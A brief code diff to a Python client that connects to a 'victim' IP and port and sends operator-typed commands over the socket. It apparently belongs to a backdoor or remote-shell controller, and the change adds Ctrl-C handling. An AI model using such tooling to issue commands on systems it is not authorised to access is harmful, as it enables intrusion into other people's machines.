@@ -12,7 +12,10 @@ victim_address = (args.ip, args.port)
 sock = socket(AF_INET, SOCK_STREAM)
 sock.connect(victim_address)
 while True:
-    msg = input("Enter a command: ")
-    sock.sendall(msg.encode("utf-8"))
+    try:
+        msg = input("Enter a command: ")
+        sock.sendall(msg.encode("utf-8"))
+    except KeyboardInterrupt:
+        break
 sock.close()
 
